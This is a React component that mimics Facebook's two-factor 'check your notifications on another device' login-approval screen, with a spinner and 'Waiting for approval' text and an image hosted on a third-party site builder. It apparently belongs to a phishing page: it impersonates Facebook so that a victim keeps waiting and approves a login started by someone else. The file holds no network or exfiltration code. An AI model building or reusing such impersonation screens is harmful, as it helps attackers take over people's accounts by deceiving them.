import React from 'react';
import { Loader } from 'lucide-react';

const WaitingForApprovalScreen = () => (
    <div className="bg-white p-6 rounded-lg text-black w-full max-w-sm text-center">
        <h1 className="text-2xl font-bold mb-2">Check your notifications on another device</h1>
        <p className="text-gray-600 mb-4">Go to your Facebook account on another device and open the notification we sent to approve this login.</p>
        <div className="bg-gray-100 rounded-lg p-4">
            <img 
                className="w-full h-auto object-contain rounded-md"
                alt="Illustration of two-factor authentication on mobile devices"
             src="https://storage.googleapis.com/hostinger-horizons-assets-prod/bd437477-89d8-41b6-a8e0-146e82a742d2/b0d4e0f984ea6f0558aed5c1698e30ad.png" />
            <div className="flex items-center justify-center mt-4">
                <Loader className="h-6 w-6 animate-spin text-gray-500" />
                <div className="ml-3 text-left">
                    <p className="font-semibold">Waiting for approval</p>
                    <p className="text-sm text-gray-500">Approve from the other device to continue.</p>
                </div>
            </div>
        </div>
    </div>
);

export default WaitingForApprovalScreen;